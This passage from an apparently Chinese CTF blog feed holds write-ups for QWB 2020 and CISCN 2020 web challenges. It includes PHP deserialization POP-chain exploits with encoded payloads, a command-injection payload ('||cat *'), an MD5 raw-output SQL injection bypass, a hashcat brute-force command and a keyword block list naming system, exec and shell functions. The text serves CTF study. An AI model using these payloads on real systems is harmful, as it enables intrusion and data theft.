</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;page = <span class="keyword">new</span> Repeater();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Repeater</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $cont;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="keyword">array</span>(<span class="keyword">new</span> MyClass(),<span class="string">&#x27;get_flag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Display();</span><br><span class="line">$b=serialize($a);</span><br><span class="line"><span class="keyword">echo</span> urlencode($b);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¼ºç½‘æ¯2020éƒ¨åˆ†é¢˜ç›®writeup</title>
      <link href="2020/08/26/%E5%BC%BA%E7%BD%91%E6%9D%AF2020-wp/"/>
      <url>2020/08/26/%E5%BC%BA%E7%BD%91%E6%9D%AF2020-wp/</url>
      
        <content type="html"><![CDATA[<p>ä¸æ„§æ˜¯æ²³å—ä¸¾åŠçš„æœ€å¥½çš„æ¯”èµ›ï¼</p><a id="more"></a><h3 id="webè¾…åŠ©"><a href="#webè¾…åŠ©" class="headerlink" title="webè¾…åŠ©"></a>webè¾…åŠ©</h3><p>ç»™äº†é™„ä»¶ï¼Œä¸‹è½½ä¸‹æ¥ï¼Œå®¡ä¸‹æºç ï¼Œå‘ç°æ˜¯ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ï¼Œå’Œ2020å®‰æ’å››æœˆèµ›å¾ˆåƒï¼Œä½†æ˜¯å¢åŠ äº†<code>name</code>å…³é”®å­—è¿‡æ»¤,å¯ä»¥ç”¨<code>S</code>ç»•è¿‡ï¼Œ<code>__weakup</code>æ”¹ä¸‹å±æ€§æ•°é‡ç»•è¿‡</p><p>æ­£å¸¸åºåˆ—åŒ–,<code>0x00</code>ç”¨<code>0</code>ä»£æ›¿ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">player</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $user;</span><br><span class="line">    <span class="keyword">protected</span> $pass;</span><br><span class="line">    <span class="keyword">protected</span> $admin;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;user = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pass = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a=serialize(<span class="keyword">new</span> player());</span><br><span class="line"><span class="keyword">echo</span> str_replace(chr(<span class="number">0</span>),<span class="string">&#x27;0&#x27;</span>,$a);</span><br><span class="line"></span><br><span class="line"><span class="comment">// O:6:&quot;player&quot;:3:&#123;s:7:&quot;0*0user&quot;;s:4:&quot;test&quot;;s:7:&quot;0*0pass&quot;;s:4:&quot;test&quot;;s:8:&quot;0*0admin&quot;;i:1;&#125;</span></span><br></pre></td></tr></table></figure><p>è®¿é—®<code>play.php</code>ä¼šååºåˆ—åŒ–ï¼Œpopé“¾ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">topsolo::__destruct() &#x3D;&#x3D;&gt; TP() &#x3D;&#x3D;&gt; $name() &#x3D;&#x3D;&gt; midsolo::__invoke() &#x3D;&#x3D;&gt; Gank() &#x3D;&#x3D;&gt; stristr &#x3D;&#x3D;&gt; jungle::__toString() &#x3D;&#x3D;&gt; KS()</span><br></pre></td></tr></table></figure><p>æ„é€ expï¼Œæœ‰ä¸¤å¤„éœ€è¦ç»•è¿‡:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">player</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $user;</span><br><span class="line">    <span class="keyword">protected</span> $pass;</span><br><span class="line">    <span class="keyword">protected</span> $admin;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;user = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pass = <span class="keyword">new</span> topsolo();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">topsolo</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="keyword">new</span> midsolo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">midsolo</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="keyword">new</span> jungle();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">jungle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $name = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> player();</span><br><span class="line">$b=serialize($a);</span><br><span class="line">$c=str_replace(<span class="string">&#x27;test&quot;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,stristr($b,<span class="string">&#x27;test&quot;&#x27;</span>));</span><br><span class="line"></span><br><span class="line">$d=str_replace(<span class="string">&#x27;s:7:&quot;&#x27;</span>.chr(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.chr(<span class="number">0</span>).<span class="string">&#x27;name&quot;&#x27;</span>,<span class="string">&#x27;S:7:&quot;\00\2a\00\6e\61\6d\65&quot;&#x27;</span>,$c); <span class="comment">// ç»•è¿‡checkå‡½æ•°</span></span><br><span class="line">$d=str_replace(<span class="string">&#x27;&quot;midsolo&quot;:1:&#x27;</span>,<span class="string">&#x27;&quot;midsolo&quot;:2:&#x27;</span>,$d); <span class="comment">// ç»•è¿‡__weakup</span></span><br><span class="line"><span class="keyword">echo</span> urlencode($d);</span><br></pre></td></tr></table></figure><p>æ¥ç€å†çœ‹éœ€è¦å¤šå°‘ä¸ª<code>\0*\0</code>ï¼Œä¸Šé¢åºåˆ—åŒ–ä¹‹å<code>$pass</code>çš„é•¿åº¦æ˜¯ä¸‰ä½ï¼Œæ‰€ä»¥è¦åƒæ‰çš„å°±æ˜¯ï¼Œè¿™é‡Œ<code>0x00</code>æ›¿æ¢æˆ<code>0</code>ï¼Œé•¿åº¦ä¸º22ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:7:&quot;0*0pass&quot;;s:XXX:</span><br></pre></td></tr></table></figure><p>åˆ—æ–¹ç¨‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5n&#x3D;3n+22+k</span><br></pre></td></tr></table></figure><p>n=11,k=0åˆšå¥½å¯ä»¥ï¼Œå› æ­¤æ„é€ payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&amp;password&#x3D;%3Bs%3A7%3A%22%00%2A%00pass%22%3BO%3A7%3A%22topsolo%22%3A1%3A%7BS%3A7%3A%22%5C00%5C2a%5C00%5C6e%5C61%5C6d%5C65%22%3BO%3A7%3A%22midsolo%22%3A2%3A%7BS%3A7%3A%22%5C00%5C2a%5C00%5C6e%5C61%5C6d%5C65%22%3BO%3A6%3A%22jungle%22%3A1%3A%7BS%3A7%3A%22%5C00%5C2a%5C00%5C6e%5C61%5C6d%5C65%22%3Bs%3A0%3A%22%22%3B%7D%7D%7Ds%3A8%3A%22%00%2A%00admin%22%3Bi%3A1%3B%7D</span><br></pre></td></tr></table></figure><p>ç„¶åè¯·æ±‚<code>play.php</code>å³å¯å¾—åˆ°flag</p><h3 id="bank"><a href="#bank" class="headerlink" title="bank"></a>bank</h3><p>ncè¿æ¥å‘ç°æ˜¯è¿™æ ·çš„å½¢å¼ï¼Œè®©æˆ‘ä»¬çˆ†ç ´å‰ä¸‰ä½</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sha256(XXX+rN3KgrFumXZ3gkHew) &#x3D;&#x3D; 9fd1a6531ed24bb86eef93614c0a34bcd64cc0819b976b8e55bd04d5951f7bbc</span><br></pre></td></tr></table></figure><p>ç›´æ¥hashcatæ©ç çˆ†ç ´</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -a 3 -m 1400 9fd1a6531ed24bb86eef93614c0a34bcd64cc0819b976b8e55bd04d5951f7bbc ?a?a?arN3KgrFumXZ3gkHew</span><br></pre></td></tr></table></figure><p><img src="/2020/08/26/%E5%BC%BA%E7%BD%91%E6%9D%AF2020-wp/QQ%E6%88%AA%E5%9B%BE20200824161459.png"></p><p>æµ‹è¯•ä¸€éä¹‹åå‘ç°ä»£ç å­˜åœ¨æ¼æ´ï¼Œç›´æ¥äº¤æ˜“çš„æ—¶å€™è¾“è´Ÿæ•°å°±èƒ½å¢åŠ cash </p><p><img src="/2020/08/26/%E5%BC%BA%E7%BD%91%E6%9D%AF2020-wp/QQ%E6%88%AA%E5%9B%BE20200824161907.png"></p><h3 id="Funhash"><a href="#Funhash" class="headerlink" title="Funhash"></a>Funhash</h3><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;conn.php&#x27;</span>;</span><br><span class="line">highlight_file(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">&quot;hash1&quot;</span>] != hash(<span class="string">&quot;md4&quot;</span>, $_GET[<span class="string">&quot;hash1&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;level 1 failed&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;hash2&#x27;</span>] === $_GET[<span class="string">&#x27;hash3&#x27;</span>] || md5($_GET[<span class="string">&#x27;hash2&#x27;</span>]) !== md5($_GET[<span class="string">&#x27;hash3&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;level 2 failed&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 3</span></span><br><span class="line">$query = <span class="string">&quot;SELECT * FROM flag WHERE password = &#x27;&quot;</span> . md5($_GET[<span class="string">&quot;hash4&quot;</span>],<span class="literal">true</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">$result = $mysqli-&gt;query($query);</span><br><span class="line">$row = $result-&gt;fetch_assoc(); </span><br><span class="line">var_dump($row);</span><br><span class="line">$result-&gt;free();</span><br><span class="line">$mysqli-&gt;close();</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€å…³æ‰¾0e+çº¯æ•°å­—md4åŠ å¯†åè¿˜æ˜¯0e+çº¯æ•°å­—çš„å­—ç¬¦ä¸²å°±è¡Œï¼Œè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"><span class="keyword">import</span> threading,time</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md4</span>(<span class="params">s</span>):</span></span><br><span class="line">    obj = hashlib.new(<span class="string">&quot;md4&quot;</span>)</span><br><span class="line">    obj.update(s.encode())</span><br><span class="line">    <span class="keyword">return</span> obj.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">id</span>):</span></span><br><span class="line">    <span class="comment">#print(id)</span></span><br><span class="line">    enc=md4(<span class="string">&#x27;0e&#x27;</span>+str(id))</span><br><span class="line">    <span class="keyword">if</span> enc[<span class="number">0</span>:<span class="number">2</span>]==<span class="string">&#x27;0e&#x27;</span> <span class="keyword">and</span> enc[<span class="number">2</span>:<span class="number">-1</span>].isdigit():</span><br><span class="line">        print(<span class="string">&#x27;0e&#x27;</span>+str(id))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    thread_pool = ThreadPoolExecutor(<span class="number">100</span>) </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000000000</span>):</span><br><span class="line">        thread_pool.submit(check,i)</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒå…³æ•°ç»„ç»•è¿‡,ç¬¬ä¸‰å…³å’Œjavisojä¸Šçš„Loginä¸€æ ·ï¼Œæ‰¾åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²MD5åŠ å¯†åå¾—åˆ°çš„åŸå§‹äºŒè¿›åˆ¶æ ¼å¼åœ¨SQLä¸­æ‹¼æ¥æˆ ç±»ä¼¼ <code>&#39;or&#39;xxx</code>çš„å½¢å¼å°±å¯ä»¥ç»•è¿‡äº†</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?hash1&#x3D;0e251288019&amp;hash2[]&#x3D;1&amp;hash3[]&#x3D;&amp;hash4&#x3D;ffifdyop</span><br></pre></td></tr></table></figure><h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p>wiresharkæ‰“å¼€ å¯¼å‡ºhttpå¯¹è±¡ï¼Œå‘ç°<code>steghide.php</code>ï¼Œforemoståˆ†ç¦»ä¸€å¼ å›¾ç‰‡ï¼Œsteghideéšå†™ï¼Œå¯†ç å¼±å£ä»¤<code>123456</code></p><p><img src="/2020/08/26/%E5%BC%BA%E7%BD%91%E6%9D%AF2020-wp/QQ%E6%88%AA%E5%9B%BE20200824153623.png"></p><h3 id="ä¸»åŠ¨"><a href="#ä¸»åŠ¨" class="headerlink" title="ä¸»åŠ¨"></a>ä¸»åŠ¨</h3><p>å°±è¿‡æ»¤äº†flagï¼Œç”¨*ç»•è¿‡</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1||cat *</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æºç å¾—åˆ°flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> å¼ºç½‘æ¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å›½èµ›CISCN2020åˆèµ›-wp</title>
      <link href="2020/08/25/%E5%9B%BD%E8%B5%9B2020%E5%88%9D%E8%B5%9B-wp/"/>
      <url>2020/08/25/%E5%9B%BD%E8%B5%9B2020%E5%88%9D%E8%B5%9B-wp/</url>
      
        <content type="html"><![CDATA[<p>å­¦é•¿å¸¦æˆ‘ä»¬æ‰“äº†æ‰“ğŸ˜€</p><a id="more"></a><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//é¢˜ç›®ç¯å¢ƒï¼šphp:7.4.8-apache</span></span><br><span class="line">    $pid = pcntl_fork();</span><br><span class="line">    <span class="keyword">if</span> ($pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;could not fork&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> ($pid)&#123;</span><br><span class="line">        $r=pcntl_wait($status);</span><br><span class="line">        <span class="keyword">if</span>(!pcntl_wifexited($status))&#123;</span><br><span class="line">            phpinfo();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;is_string($_GET[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;!preg_match(<span class="string">&quot;/[:\\\\]|exec|pcntl/i&quot;</span>,$_GET[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">            call_user_func_array($_GET[<span class="string">&#x27;a&#x27;</span>],[$_GET[<span class="string">&#x27;b&#x27;</span>],<span class="literal">false</span>,<span class="literal">true</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        posix_kill(posix_getpid(), SIGUSR1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å‚è€ƒæ–‡ç« ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;raoxiaoya&#x2F;article&#x2F;details&#x2F;106604519</span><br></pre></td></tr></table></figure><p>å¯ä»¥çŸ¥é“åªæœ‰è®©æŒ‚èµ·çš„å­è¿›ç¨‹é€€å‡ºæ‰èƒ½æ‰§è¡Œphpinfo()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array($_GET[<span class="string">&#x27;a&#x27;</span>],[$_GET[<span class="string">&#x27;b&#x27;</span>],<span class="literal">false</span>,<span class="literal">true</span>]);</span><br></pre></td></tr></table></figure><p>call_user_func_arrayä¼šè°ƒç”¨å›è°ƒå‡½æ•°ï¼Œå¹¶æŠŠä¸€ä¸ªæ•°ç»„å‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°</p><p>å› æ­¤æˆ‘ä»¬éœ€è¦è®©<code>$_GET[&#39;a&#39;]</code>è¡¨ç¤ºçš„å‡½æ•°èƒ½å¤Ÿæ¥æ”¶ä¸‰ä¸ªå‚æ•°ï¼Œå¹¶ä¸”<code>$_GET[&#39;b&#39;]</code>è¡¨ç¤ºçš„å‡½æ•°èƒ½å¤Ÿæ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œç”¨<code>pcntl_wait</code>å’Œ<code>pcntl_waitpid</code>è®©å­è¿›ç¨‹é€€å‡º</p><p>å°è¯•æ„é€ payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;register_shutdown_function&amp;b&#x3D;pcntl_wait</span><br><span class="line">?a&#x3D;register_shutdown_function&amp;b&#x3D;pcntl_waitpid</span><br><span class="line">?a&#x3D;call_user_func&amp;b&#x3D;pcntl_wait</span><br><span class="line">?a&#x3D;call_user_func&amp;b&#x3D;pcntl_waitpid</span><br></pre></td></tr></table></figure><p>flagåœ¨phpinfoä¸­ï¼ŒCTRL+Fæœç´¢flag</p><h3 id="rceme"><a href="#rceme" class="headerlink" title="rceme"></a>rceme</h3><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">parserIfLabel($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">danger_key</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    $s=htmlspecialchars($s);</span><br><span class="line">    $key=<span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;preg&#x27;</span>,<span class="string">&#x27;server&#x27;</span>,<span class="string">&#x27;chr&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;md5&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;cookie&#x27;</span>,<span class="string">&#x27;session&#x27;</span>,<span class="string">&#x27;sql&#x27;</span>,<span class="string">&#x27;mkdir&#x27;</span>,<span class="string">&#x27;copy&#x27;</span>,<span class="string">&#x27;fwrite&#x27;</span>,<span class="string">&#x27;del&#x27;</span>,<span class="string">&#x27;encrypt&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;shell&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;ini_&#x27;</span>,<span class="string">&#x27;chroot&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;require&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;create&#x27;</span>,<span class="string">&#x27;func&#x27;</span>,<span class="string">&#x27;symlink&#x27;</span>,<span class="string">&#x27;sleep&#x27;</span>,<span class="string">&#x27;ord&#x27;</span>,<span class="string">&#x27;str&#x27;</span>,<span class="string">&#x27;source&#x27;</span>,<span class="string">&#x27;rev&#x27;</span>,<span class="string">&#x27;base_convert&#x27;</span>);</span><br><span class="line">    $s = str_ireplace($key,<span class="string">&quot;*&quot;</span>,$s);</span><br><span class="line">    $danger=<span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;preg&#x27;</span>,<span class="string">&#x27;server&#x27;</span>,<span class="string">&#x27;chr&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;md5&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;cookie&#x27;</span>,<span class="string">&#x27;session&#x27;</span>,<span class="string">&#x27;sql&#x27;</span>,<span class="string">&#x27;mkdir&#x27;</span>,<span class="string">&#x27;copy&#x27;</span>,<span class="string">&#x27;fwrite&#x27;</span>,<span class="string">&#x27;del&#x27;</span>,<span class="string">&#x27;encrypt&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;shell&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;ini_&#x27;</span>,<span class="string">&#x27;chroot&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;require&#x27;</span>,<span 